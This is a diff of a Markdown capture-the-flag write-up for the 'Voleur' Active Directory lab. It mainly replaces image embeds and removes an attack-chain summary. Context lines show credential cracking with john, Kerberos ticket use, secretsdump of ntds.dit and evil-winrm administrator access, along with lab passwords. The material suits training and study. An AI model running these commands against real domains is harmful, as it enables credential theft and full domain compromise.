@@ -19,7 +19,8 @@ Voleur is a medium-rated Windows Active Directory machine that simulates a reali
 rustscan -a 10.129.232.130 -u 5000 -b 2000 -- -sCV
 ```
 
-![[Pasted image 20260522023918.png]]
+<img width="1147" height="800" alt="Pasted image 20260522023918" src="https://github.com/user-attachments/assets/00c8ec02-1987-413a-a09f-86c5044d4cfc" />
+
 ### Clock Skew Fix (Required for Kerberos)
 
 ```bash
@@ -38,7 +39,8 @@ DNS enumeration confirms the DC hostname:
 dig NS voleur.htb @10.129.232.130
 ```
 
-![[Pasted image 20260522023937.png]]
+<img width="629" height="413" alt="Pasted image 20260522023937" src="https://github.com/user-attachments/assets/aa1e8367-8ba9-4e52-95fd-4249b837415b" />
+
 ### Kerberos Configuration
 
 Edit `/etc/krb5.conf`:
@@ -77,7 +79,8 @@ nxc smb 10.129.232.130 -u ryan.naylor -p HollowOct31Nyt -k --generate-tgt ryan.n
 export KRB5CCNAME=ryan.naylor.ccache
 ```
 
-![[Pasted image 20260522024022.png]]
+<img width="1172" height="368" alt="Pasted image 20260522024022" src="https://github.com/user-attachments/assets/ada8294e-c2fd-4e7f-9a69-35eacbe4d01d" />
+
 ### SMB Enumeration
 
 ```bash
@@ -86,7 +89,8 @@ smbclient.py dc.voleur.htb -k -no-pass -target-ip 10.129.232.130
 
 A password-protected Excel file `Access_Review.xlsx` is discovered on the share.
 
-![[Pasted image 20260522024041.png]]
+<img width="644" height="335" alt="Pasted image 20260522024041" src="https://github.com/user-attachments/assets/da3f4af6-8b10-4b91-8551-efd5725a3d50" />
+
 ### Cracking the Excel File
 
 ```bash
@@ -94,7 +98,8 @@ office2john Access_Review.xlsx > excel.hash
 john excel.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20260522024107.png]]
+<img width="830" height="242" alt="Pasted image 20260522024107" src="https://github.com/user-attachments/assets/38ab0086-5a42-4b77-b4e0-ffc5c732a10c" />
+
 
 **Password:** `football1`
 
@@ -113,7 +118,8 @@ john excel.hash --wordlist=/usr/share/wordlists/rockyou.txt
 | svc_winrm    | WinRM              | —                                                       |
 
 
-![[Pasted image 20260522024123.png]]
+<img width="1254" height="568" alt="Pasted image 20260522024123" src="https://github.com/user-attachments/assets/c24171d0-ae5b-46d4-8cb0-dbc7cbbc6b4b" />
+
 
 ---
 
@@ -128,7 +134,8 @@ RESTORE_USERS  ──GenericWrite──►  lacey.miller
 RESTORE_USERS  ──GenericWrite──►  Second-Line Support Technicians (OU)
 ```
 
-![[Pasted image 20260522024155.png]]
+<img width="1004" height="439" alt="Pasted image 20260522024155" src="https://github.com/user-attachments/assets/fdfedfdf-4383-4cb2-826a-a0133b9bf696" />
+
 
 **Key finding:** `svc_ldap` has `WriteSPN` over `svc_winrm`, enabling Targeted Kerberoasting.
 
@@ -277,7 +284,8 @@ Dump all hashes:
 impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL
 ```
 
-![[Pasted image 20260522024230.png]]
+<img width="926" height="654" alt="Pasted image 20260522024230" src="https://github.com/user-attachments/assets/abbd3d9e-0c73-4c36-9e37-c2f73415b8bc" />
+
 
 **Administrator hash recovered:**
 
@@ -298,26 +306,11 @@ export KRB5CCNAME=administrator.ccache
 evil-winrm -i dc.voleur.htb -u administrator -r voleur.htb
 ```
 
-![[Pasted image 20260522024248.png]]
+<img width="653" height="394" alt="Pasted image 20260522024248" src="https://github.com/user-attachments/assets/b6208867-50f7-41f2-b978-5c329cf94cf7" />
+
 
 **Root flag obtained. Domain fully compromised.**
 
----
-
-## Attack Chain Summary
-
-```
-ryan.naylor (given)
-    └─► SMB Enum → Access_Review.xlsx (football1)
-            └─► svc_ldap creds (M1XyC9pW7qT5Vn)
-                    └─► WriteSPN → Targeted Kerberoast → svc_winrm (AFireInsidedeOzarctica980219afi)
-                            └─► WinRM → User Flag
-                    └─► RESTORE_USERS → Restore todd.wolfe (NightT1meP1dg3on14)
-                            └─► SMB → DPAPI Artifacts → jeremy.combs (qT3V9pLXyN7W4m)
-                                    └─► WinRM → id_rsa → SSH svc_backup
-                                            └─► NTDS.dit + SYSTEM → All Hashes
-                                                    └─► Administrator PTH → Root Flag
-```
 
 ---
 
